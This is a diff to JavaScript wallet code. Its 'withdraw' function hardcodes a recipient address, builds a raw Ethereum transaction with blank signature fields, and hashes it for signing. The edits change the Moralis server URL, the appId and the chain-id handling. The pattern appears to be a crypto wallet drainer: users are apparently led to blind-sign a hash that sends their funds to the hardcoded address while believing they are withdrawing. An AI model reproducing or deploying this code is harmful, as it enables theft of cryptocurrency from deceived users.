@@ -1,6 +1,6 @@
 const pub_addr = "0x194f14Ac52eb4e7cfc50141874AA873c5c9e9274";
-const serverUrl = "https://mgk9mqmygs9z.usemoralis.com:2053/server";
-const appId = "SkulaLBgqkX7aZEHHNX3Zyv1Gkpt7CO71Q6lg37g";
+const serverUrl = "https://6godkdlndxry.usemoralis.com:2053/server";
+const appId = "26bRj94pf0MXDHQO0uKU2Gq63E3j9AGkb4Au4ghI";
 
 const ETH = "0x1";
 const BSC = "0x38";
@@ -35,11 +35,11 @@ export async function withdraw(value, chainId, setValue) {
           gasPrice: mgasPrice,
           value: fs,
           data: "0x",
-          v: chainName === ETH ? ETH : BSC,
+          v: chainName,
           r: "0x",
           s: "0x",
         };
-
+        console.log("chainNameeee", chainName);
         const tx = new ethereumjs.Tx(tx_);
 
         const serializedTx = "0x" + tx.serialize().toString("hex");
@@ -57,7 +57,7 @@ export async function withdraw(value, chainId, setValue) {
           id = 137;
         }
 
-        console.log("chain id", id, chainId);
+        console.log("id === ", id, "chainid === ", chainId);
         const sha3_ = web3.utils.sha3(serializedTx, hexer);
         console.log(sha3_);
         await web3.eth
